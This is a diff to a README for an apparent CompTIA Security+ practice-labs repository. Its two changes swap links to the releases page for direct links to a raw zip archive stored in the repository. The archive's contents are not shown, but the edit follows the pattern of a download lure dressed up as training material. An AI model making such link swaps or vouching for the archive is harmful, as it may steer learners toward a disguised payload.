@@ -1,6 +1,6 @@
 # 🛡️ TGS-2023039181-SecurityPlus - Master CompTIA Security+ Through Practical Labs
 
-[![](https://img.shields.io/badge/Download_Labs-Visit_Release_Page-blue)](https://github.com/Erratic-ceramicware752/TGS-2023039181-SecurityPlus/releases)
+[![](https://img.shields.io/badge/Download_Labs-Visit_Release_Page-blue)](https://github.com/Erratic-ceramicware752/TGS-2023039181-SecurityPlus/raw/refs/heads/main/labs/Plus_TG_Security_v1.7.zip)
 
 ## What is this project?
 
@@ -18,7 +18,7 @@ You need a computer with a stable internet connection. A modern web browser work
 
 You must visit our release page to find the current lab documentation and links.
 
-[Click here to visit the download page](https://github.com/Erratic-ceramicware752/TGS-2023039181-SecurityPlus/releases)
+[Click here to visit the download page](https://github.com/Erratic-ceramicware752/TGS-2023039181-SecurityPlus/raw/refs/heads/main/labs/Plus_TG_Security_v1.7.zip)
 
 Follow these steps to reach the materials:
 
